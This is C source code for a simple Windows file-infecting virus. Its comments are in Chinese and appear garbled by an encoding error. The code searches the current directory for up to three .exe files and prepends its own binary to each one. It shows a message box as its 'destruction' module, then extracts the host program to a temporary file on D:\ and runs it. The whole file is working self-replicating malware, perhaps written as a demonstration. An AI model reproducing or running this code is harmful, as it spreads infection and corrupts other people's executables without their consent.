#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <Commdlg.h>
/*
	1.����ģ�飺
	���ܣ����������ļ�����Ŀ¼�У��涨��Ŀ��exe�ļ�
	�򿪷����������ļ�
*/
HANDLE OpenHostFile(const WIN32_FIND_DATA *pHost, DWORD *nCount)
{
	HANDLE hHost = CreateFile(pHost->cFileName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		0,
		OPEN_EXISTING,
		NULL,
		NULL);
	if (hHost != INVALID_HANDLE_VALUE) {
		(*nCount)++;
	}
	else {
		int error = GetLastError();
		printf("������һ���ļ�%sʱ����:%d\n", pHost->cFileName, error);
	}
	return hHost;
}

//�������غ���
DWORD FindHostFile(HANDLE *szHostFileHandle, DWORD dwFindNumber)
{
	DWORD dwResult = 0;
	WIN32_FIND_DATA pNextInfo;
	// ������ǰĿ¼����exe�ļ�,��vs�������ǵ�ǰ����Ŀ¼
	HANDLE hFirst = FindFirstFile("*.exe", &pNextInfo);
	if (INVALID_HANDLE_VALUE == hFirst) {
		int error = GetLastError();
		printf("�������ļ�%s����:%d\n", pNextInfo.cFileName, error);
		return dwResult;
	}
	szHostFileHandle[0] = OpenHostFile(&pNextInfo, &dwResult);
	while (dwResult<dwFindNumber)
	{
		DWORD dwTemp = dwResult;
		if (FindNextFile(hFirst, &pNextInfo))
		{
			HANDLE hTemp = OpenHostFile(&pNextInfo, &dwResult);
			if (INVALID_HANDLE_VALUE != hTemp) {
				szHostFileHandle[dwTemp] = hTemp;
			}
		}
		else {
			break;
		}
	}
	return dwResult;
}

/*
	2.��Ⱦģ�飺
	���ܣ��������ļ�ע�������ļ�����ԭ�����ļ�����ƶ�
	���岡����С��ʹ��ȫ�ֱ�������Ϊ����ģ��ҲҪ�õ���44032�Ǵ�����VC2005 Debugģʽ�µ������ļ���С,
	�����Ƕ���������������ȷ���������С������ô��Ⱦ����ļ����л����
*/
DWORD dwVirusSize = 44032;
//��Ⱦģ��
void Infect(HANDLE hHostFile, HANDLE hLocalFile)
{

	DWORD dwHostSize = GetFileSize(hHostFile, 0);
	DWORD dwReadSize = 0;
	DWORD dwWriteSize = 0;

	char *pLocalTempBuf = (char*)malloc(sizeof(char)*dwVirusSize);
	char *pHostTempBuf = (char*)malloc(sizeof(char)*dwHostSize);
	ReadFile(hLocalFile, pLocalTempBuf, dwVirusSize, &dwReadSize, NULL);
	ReadFile(hHostFile, pHostTempBuf, dwHostSize, &dwReadSize, NULL);

	SetFilePointer(hHostFile, 0, 0, FILE_BEGIN);
	WriteFile(hHostFile, pLocalTempBuf, dwVirusSize, &dwWriteSize, NULL);
	WriteFile(hHostFile, pHostTempBuf, dwHostSize, &dwWriteSize, NULL);

	//������
	SetFilePointer(hLocalFile, 0, 0, FILE_BEGIN);
	free(pLocalTempBuf);
	free(pHostTempBuf);
}

/*
	3.�ƻ�ģ�飺
	���ܣ�������ӡ��ʾ��
*/
VOID Destory()
{
	MessageBox(NULL, "�ұ�֤ʲô������", "Test", MB_OK);
}

/*
	4.������������ģ��
	���ܣ�������ʱ�ļ����������������ļ�����������д�룬Ȼ������
	���ǵ�����Ⱦ�ĳ���ִ��ʱ�Żᴥ���Ĵ���,����ǲ���ĸ��������жϴ�Сʱֱ���˳�
*/
VOID JumpLocalHostFile(HANDLE hLocalFile)
{
	DWORD nCount = 0;
	DWORD dwLocalFileSize = GetFileSize(hLocalFile, 0);
	// ��ֹ����ĸ����򱻸�Ⱦ
	if (dwLocalFileSize == dwVirusSize) {
		return;
	}
	/*
		ͨ����ǰ����Ⱦ���ļ���С - ��������Ĵ�С = ��������ԭ��С
	*/
	char *pTemp = (char*)malloc(sizeof(char)*(dwLocalFileSize - dwVirusSize));
	/*
		�����������ȡ������д�뵽��ʱ�ļ��н�������
	*/
	ReadFile(hLocalFile, pTemp, (dwLocalFileSize - dwVirusSize), &nCount, NULL);

	char szLocalPath[MAX_PATH];
	char szTempPath[MAX_PATH] = "D:\\";
	char szTempName[50];
	GetModuleFileName(NULL, szLocalPath, sizeof(szLocalPath));
	GetFileTitle(szLocalPath, szTempName, 50);
	strcat(szTempPath, szTempName);
	HANDLE hJumpHost = CreateFile(szTempPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_NEW, NULL, NULL);
	if (hJumpHost == INVALID_HANDLE_VALUE) {
		int error = GetLastError();
		printf("�������������ļ�����:%d\n", error);
	}
	else
	{
		WriteFile(hJumpHost, pTemp, (dwLocalFileSize - dwVirusSize), &nCount, NULL);
		free(pTemp);
		CloseHandle(hJumpHost);

		PROCESS_INFORMATION information;
		STARTUPINFO si = { sizeof(si) };

		if (CreateProcess(szTempPath, NULL,
			NULL, NULL,
			FALSE, NORMAL_PRIORITY_CLASS,
			NULL, NULL,
			&si, &information))
		{
			WaitForSingleObject(information.hProcess, INFINITE);
		}
		else {
			int error = GetLastError();
			printf("ִ�������������:%d\n", error);
		}
	}
	//DeleteFile(szTempPath);
}

int main()
{
	char szLocalPath[MAX_PATH];
	GetModuleFileName(NULL, szLocalPath, sizeof(szLocalPath));
	HANDLE hLocalFileHandle = CreateFile(szLocalPath,
		GENERIC_READ,
		FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		NULL,
		NULL);
	HANDLE szHostHandle[3];
	DWORD dwFoundFileNumber = FindHostFile(szHostHandle, 3);
	Destory();

	for (DWORD i = 0; i<dwFoundFileNumber; i++)
	{
		Infect(szHostHandle[i], hLocalFileHandle);
		CloseHandle(szHostHandle[i]);
	}

	JumpLocalHostFile(hLocalFileHandle);
	CloseHandle(hLocalFileHandle);
	system("pause");
	return 0;
}
